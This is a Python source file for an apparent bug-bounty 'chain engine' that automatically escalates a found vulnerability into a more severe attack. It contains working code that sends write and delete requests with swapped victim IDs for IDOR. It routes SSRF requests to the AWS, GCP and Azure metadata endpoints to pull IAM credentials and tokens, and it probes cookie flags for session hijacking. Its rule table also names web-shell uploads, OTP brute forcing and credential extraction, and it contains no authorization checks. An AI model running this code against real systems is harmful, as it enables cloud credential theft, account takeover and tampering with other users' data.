#!/usr/bin/env python3
"""
chain_engine.py — Auto-Escalation Engine

When any tool finds a vulnerability, automatically attempts to chain it
to higher severity. This is what separates $500 reports from $50K reports.

Bug A (found) → hunt for Bug B → escalate to C → report as chain

Usage:
    from chain_engine import ChainEngine
    engine = ChainEngine(domain="target.com")
    chains = engine.escalate(finding)
"""
import json
import os
import re
import time
from pathlib import Path
from urllib.parse import urlparse, urljoin

try:
    import requests
except ImportError:
    requests = None

# ── Chain Definitions ──────────────────────────────────────────────────────────

CHAIN_RULES = [
    {
        "trigger": "idor",
        "description": "IDOR read → IDOR write → mass data manipulation",
        "steps": [
            {"action": "test_write_methods", "methods": ["PUT", "PATCH", "DELETE"]},
            {"action": "test_id_enumeration", "range": 100},
            {"action": "quantify_impact"},
        ],
        "escalation": "IDOR read → IDOR write (CRITICAL)",
        "bounty_multiplier": "3-5x",
    },
    {
        "trigger": "ssrf",
        "description": "SSRF → cloud metadata → IAM credentials → RCE",
        "steps": [
            {"action": "hit_cloud_metadata", "targets": [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            ]},
            {"action": "extract_credentials"},
        ],
        "escalation": "SSRF → Cloud Infrastructure Compromise (CRITICAL)",
        "bounty_multiplier": "10-20x",
    },
    {
        "trigger": "xss",
        "description": "XSS → check cookie flags → session hijack → ATO",
        "steps": [
            {"action": "check_cookie_flags"},
            {"action": "test_session_hijack"},
            {"action": "test_account_takeover"},
        ],
        "escalation": "XSS → Account Takeover (CRITICAL)",
        "bounty_multiplier": "5-10x",
    },
    {
        "trigger": "open_redirect",
        "description": "Open redirect → OAuth redirect_uri → auth code theft → ATO",
        "steps": [
            {"action": "find_oauth_endpoints"},
            {"action": "test_redirect_uri_bypass"},
        ],
        "escalation": "Open Redirect → OAuth Token Theft → ATO (CRITICAL)",
        "bounty_multiplier": "10x",
    },
    {
        "trigger": "cors",
        "description": "CORS reflection → credentialed data theft",
        "steps": [
            {"action": "test_credentials_include"},
            {"action": "test_data_theft"},
        ],
        "escalation": "CORS Misconfiguration → Authenticated Data Theft (HIGH)",
        "bounty_multiplier": "3x",
    },
    {
        "trigger": "rate_limit",
        "description": "Missing rate limit → OTP brute force → ATO",
        "steps": [
            {"action": "find_otp_endpoints"},
            {"action": "test_brute_force"},
        ],
        "escalation": "Rate Limit Bypass → OTP Brute Force → ATO (CRITICAL)",
        "bounty_multiplier": "5x",
    },
    {
        "trigger": "graphql_introspection",
        "description": "Introspection → field enumeration → missing auth → mass PII",
        "steps": [
            {"action": "enumerate_fields"},
            {"action": "test_field_auth"},
        ],
        "escalation": "GraphQL Introspection → Mass PII Exfiltration (CRITICAL)",
        "bounty_multiplier": "5x",
    },
    {
        "trigger": "file_upload",
        "description": "File upload → web shell → RCE",
        "steps": [
            {"action": "test_extension_bypass"},
            {"action": "test_content_type_bypass"},
            {"action": "test_web_shell"},
        ],
        "escalation": "Unrestricted File Upload → RCE (CRITICAL)",
        "bounty_multiplier": "10x",
    },
    {
        "trigger": "debug_endpoint",
        "description": "Debug endpoint → env vars → cloud credentials → access",
        "steps": [
            {"action": "extract_env_vars"},
            {"action": "test_credentials"},
        ],
        "escalation": "Debug Endpoint → Credential Leak → Infrastructure Access (CRITICAL)",
        "bounty_multiplier": "5x",
    },
    {
        "trigger": "host_header_injection",
        "description": "Host header → password reset poisoning → ATO",
        "steps": [
            {"action": "test_password_reset_poison"},
        ],
        "escalation": "Host Header Injection → Password Reset Poisoning → ATO (CRITICAL)",
        "bounty_multiplier": "5x",
    },
]


class ChainEngine:
    """Auto-escalation engine that chains bugs for maximum severity."""

    def __init__(self, domain: str, auth_headers: dict = None):
        self.domain = domain
        self.auth_headers = auth_headers or {}
        self.session = requests.Session() if requests else None
        self.chains_found = []

    def classify_finding(self, finding: dict) -> str:
        """Classify a finding into a trigger category."""
        text = json.dumps(finding).lower()
        triggers = {
            "idor": ["idor", "bola", "insecure direct", "object reference", "id swap"],
            "ssrf": ["ssrf", "server-side request", "internal request", "metadata"],
            "xss": ["xss", "cross-site scripting", "reflected", "stored xss", "dom xss"],
            "open_redirect": ["open redirect", "redirect", "url redirect"],
            "cors": ["cors", "cross-origin", "access-control"],
            "rate_limit": ["rate limit", "no rate", "missing rate", "brute"],
            "graphql_introspection": ["graphql", "introspection", "__schema"],
            "file_upload": ["file upload", "upload", "unrestricted"],
            "debug_endpoint": ["debug", "actuator", "phpinfo", "env", "config"],
            "host_header_injection": ["host header", "host injection"],
        }
        for trigger, keywords in triggers.items():
            if any(kw in text for kw in keywords):
                return trigger
        return ""

    def get_applicable_chains(self, finding: dict) -> list[dict]:
        """Get all chain rules that apply to this finding."""
        trigger = self.classify_finding(finding)
        if not trigger:
            return []
        return [r for r in CHAIN_RULES if r["trigger"] == trigger]

    def escalate_idor(self, url: str, original_id: str,
                      victim_id: str) -> dict:
        """Escalate IDOR read to IDOR write."""
        results = {"chain": "IDOR escalation", "steps": []}

        # Step 1: Test write methods
        test_url = url.replace(original_id, victim_id)
        for method in ["PUT", "PATCH", "DELETE"]:
            try:
                resp = self.session.request(
                    method, test_url, headers=self.auth_headers,
                    json={"test": "escalation_probe"}, timeout=8)
                if resp.status_code in (200, 201, 204):
                    results["steps"].append({
                        "method": method,
                        "url": test_url,
                        "status": resp.status_code,
                        "write_confirmed": True,
                    })
                    results["severity"] = "CRITICAL"
                    results["escalated"] = True
                    break
            except Exception:
                continue

        # Step 2: Test enumeration range
        base_url = re.sub(r'\d+', '{ID}', url)
        enumerable = 0
        for test_id in range(1, 21):
            enum_url = base_url.replace('{ID}', str(test_id))
            try:
                resp = self.session.get(enum_url, headers=self.auth_headers, timeout=5)
                if resp.status_code == 200:
                    enumerable += 1
            except Exception:
                continue

        if enumerable > 5:
            results["steps"].append({
                "enumerable_ids": enumerable,
                "estimated_total": enumerable * 5,
                "impact": f"Affects ~{enumerable * 50}+ users",
            })

        return results

    def escalate_ssrf(self, ssrf_url: str, ssrf_param: str) -> dict:
        """Escalate SSRF to cloud metadata extraction."""
        results = {"chain": "SSRF → Cloud", "steps": []}

        metadata_targets = [
            ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/"),
            ("AWS IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("AWS UserData", "http://169.254.169.254/latest/user-data"),
            ("GCP Token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
        ]

        for name, target in metadata_targets:
            try:
                if "?" in ssrf_url:
                    test_url = f"{ssrf_url}&{ssrf_param}={target}"
                else:
                    test_url = f"{ssrf_url}?{ssrf_param}={target}"

                resp = self.session.get(test_url, headers=self.auth_headers, timeout=10)
                if resp.status_code == 200 and len(resp.text) > 20:
                    # Check for credential markers
                    cred_markers = ["AccessKeyId", "SecretAccessKey", "Token",
                                   "access_token", "iam", "instance-id"]
                    has_creds = any(m in resp.text for m in cred_markers)

                    results["steps"].append({
                        "target": name,
                        "url": target,
                        "status": resp.status_code,
                        "has_credentials": has_creds,
                        "body_preview": resp.text[:500],
                    })
                    if has_creds:
                        results["severity"] = "CRITICAL"
                        results["escalated"] = True
            except Exception:
                continue

        return results

    def escalate_xss(self, xss_url: str) -> dict:
        """Escalate XSS to ATO by checking cookie security."""
        results = {"chain": "XSS → ATO", "steps": []}

        try:
            resp = self.session.get(xss_url, headers=self.auth_headers, timeout=8)
            cookies = resp.headers.get("Set-Cookie", "")
            all_cookies = resp.headers.get_all("Set-Cookie") if hasattr(
                resp.headers, 'get_all') else [cookies]

            for cookie_header in all_cookies:
                cookie_lower = cookie_header.lower()
                httponly = "httponly" in cookie_lower
                secure = "secure" in cookie_lower
                samesite = "samesite" in cookie_lower

                if not httponly:
                    results["steps"].append({
                        "cookie": cookie_header[:100],
                        "httponly": False,
                        "impact": "Session cookie stealable via XSS → ATO",
                    })
                    results["severity"] = "CRITICAL"
                    results["escalated"] = True

                results["steps"].append({
                    "httponly": httponly,
                    "secure": secure,
                    "samesite": samesite,
                })
        except Exception:
            pass

        return results

    def escalate(self, finding: dict) -> dict:
        """Main entry point: try to escalate any finding to higher severity."""
        trigger = self.classify_finding(finding)
        chains = self.get_applicable_chains(finding)

        result = {
            "original_finding": finding,
            "trigger": trigger,
            "applicable_chains": len(chains),
            "escalation_attempts": [],
            "escalated": False,
            "final_severity": finding.get("severity", "MEDIUM"),
        }

        if not chains:
            return result

        url = finding.get("url", finding.get("endpoint", ""))

        for chain in chains:
            attempt = {
                "chain": chain["description"],
                "escalation_target": chain["escalation"],
                "bounty_multiplier": chain["bounty_multiplier"],
            }

            if trigger == "idor":
                esc = self.escalate_idor(
                    url,
                    finding.get("original_id", "1"),
                    finding.get("victim_id", "2"))
                attempt.update(esc)
            elif trigger == "ssrf":
                esc = self.escalate_ssrf(url, finding.get("param", "url"))
                attempt.update(esc)
            elif trigger == "xss":
                esc = self.escalate_xss(url)
                attempt.update(esc)

            result["escalation_attempts"].append(attempt)

            if attempt.get("escalated"):
                result["escalated"] = True
                result["final_severity"] = "CRITICAL"
                self.chains_found.append(attempt)

        return result

    def save_chains(self) -> None:
        """Save discovered chains to disk."""
        out_dir = Path(f"findings/{self.domain}/chains")
        out_dir.mkdir(parents=True, exist_ok=True)
        if self.chains_found:
            out_file = out_dir / f"chains_{int(time.time())}.json"
            out_file.write_text(json.dumps(self.chains_found, indent=2, default=str))
